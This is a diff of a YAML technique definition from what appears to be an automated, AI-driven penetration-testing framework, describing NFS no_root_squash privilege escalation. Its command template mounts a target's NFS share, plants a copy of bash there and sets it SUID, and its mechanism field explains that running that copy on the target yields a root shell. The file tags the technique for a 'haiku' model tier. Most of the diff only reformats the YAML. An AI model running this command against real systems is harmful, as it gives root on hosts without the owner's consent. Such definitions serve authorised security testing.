@@ -2,15 +2,18 @@ name: nfs_nosquash
 category: privesc
 description: NFS no_root_squash exploitation
 preconditions:
-  - os==linux
+- os==linux
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "mount -t nfs {target_ip}:/{share} /mnt/nfs && cp /bin/bash /mnt/nfs/rootbash && chmod +s /mnt/nfs/rootbash"
+command_template: mount -t nfs {target_ip}:/{share} /mnt/nfs && cp /bin/bash /mnt/nfs/rootbash
+  && chmod +s /mnt/nfs/rootbash
 parser: null
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "If NFS export has no_root_squash, files created as root on attacker maintain root ownership on target. Create SUID bash, execute on target for root shell."
+mechanism: If NFS export has no_root_squash, files created as root on attacker maintain
+  root ownership on target. Create SUID bash, execute on target for root shell.
+hacktricks_ref: linux-hardening/privilege-escalation/README.md
